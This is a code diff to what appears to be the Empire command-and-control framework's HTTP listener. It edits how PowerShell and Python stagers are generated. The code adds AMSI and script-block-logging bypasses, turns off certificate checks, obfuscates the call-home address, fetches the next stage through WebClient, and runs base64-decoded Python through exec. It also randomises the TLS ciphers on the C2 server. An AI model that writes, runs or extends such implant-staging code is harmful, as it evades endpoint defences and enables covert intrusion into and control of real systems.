@@ -319,17 +319,18 @@ class Listener(object):
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
                     # ScriptBlock Logging bypass
-                    if scriptLogBypass:
-                        stager += bypasses.scriptBlockLogBypass()
-                    # @mattifestation's AMSI bypass
-                    if AMSIBypass:
-                        stager += bypasses.AMSIBypass()
-                    # rastamouse AMSI bypass
-                    if AMSIBypass2:
-                        stager += bypasses.AMSIBypass2()
+                if scriptLogBypass:
+                    stager += bypasses.scriptBlockLogBypass()
+                # @mattifestation's AMSI bypass
+                if AMSIBypass:
+                    stager += bypasses.AMSIBypass()
+                # rastamouse AMSI bypass
+                if AMSIBypass2:
+                    stager += bypasses.AMSIBypass2()
+                if safeChecks.lower() == 'true':
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
-                
+
                 stager += helpers.randomize_capitalization(
                     "$" + helpers.generate_random_script_var_name("wc") + "=New-Object System.Net.WebClient;")
                 if userAgent.lower() == 'default':
@@ -339,7 +340,7 @@ class Listener(object):
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-                
+                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
                 if userAgent.lower() != 'none':
                     stager += helpers.randomize_capitalization(
                         "$" + helpers.generate_random_script_var_name("wc") + '.Headers.Add(')
@@ -398,7 +399,7 @@ class Listener(object):
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL',
                                                              meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
-                stager += "$ser=" + helpers.obfuscate_call_home_address(host) + ";$t='" + stage0 + "';"
+
                 # Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -531,7 +532,7 @@ class Listener(object):
                     launchEncoded = base64.b64encode(launcherBase.encode('UTF-8')).decode('UTF-8')
                     if isinstance(launchEncoded, bytes):
                         launchEncoded = launchEncoded.decode('UTF-8')
-                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | /usr/bin/python3 &" % (
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python3 &" % (
                         launchEncoded)
                     return launcher
                 else:
@@ -897,7 +898,7 @@ def send_message(packets=None):
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-            
+                    
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4     
@@ -1238,9 +1239,9 @@ def send_message(packets=None):
                 
                 context = ssl.SSLContext(proto)
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key" % (certPath))
-                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
-                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
-                selectciph = random.choice(cipherlist)
+                cipherlist_tls12 = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384", "AES256-SHA256", "AES128-SHA256"]
+                cipherlist_tls10 = ["ECDHE-RSA-AES256-SHA"]
+                selectciph = random.choice(cipherlist_tls12)+':'+random.choice(cipherlist_tls10)
                 context.set_ciphers(selectciph)
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
